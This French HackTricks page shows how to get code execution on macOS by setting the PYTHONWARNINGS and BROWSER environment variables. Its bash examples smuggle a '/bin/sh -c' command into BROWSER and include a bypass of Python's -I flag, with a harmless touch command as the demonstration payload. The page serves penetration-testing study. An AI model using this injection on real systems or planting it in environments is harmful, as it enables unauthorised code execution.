# Injection dans les applications Python de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via les variables d'environnement `PYTHONWARNINGS` et `BROWSER`

Il est possible de modifier ces deux variables d'environnement afin d'exécuter du code arbitraire chaque fois que Python est appelé, par exemple :<sup>[[1]](#references)</sup>
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Références

- [1] [Hacking avec les variables d'environnement - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
